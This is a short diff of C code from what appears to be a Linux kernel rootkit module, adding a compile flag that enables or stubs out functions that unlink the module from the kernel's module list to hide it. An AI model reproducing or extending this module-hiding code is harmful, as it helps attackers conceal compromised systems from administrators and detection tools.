@@ -4,6 +4,7 @@
 #include "privileges.h"
 #include "hide.h"
 
+#ifdef HIDE_MODULE_FROM_LIST
 static struct list_head *prev_module;
 int is_hidden = 0;
 
@@ -27,6 +28,10 @@ notrace void show_self(void)
     list_add(&THIS_MODULE->list, prev_module);
     is_hidden = 0;
 }
+#else
+notrace void hide_self(void) { return; }
+notrace void show_self(void) { return; }
+#endif
 
 notrace void unload_self(void)
 {
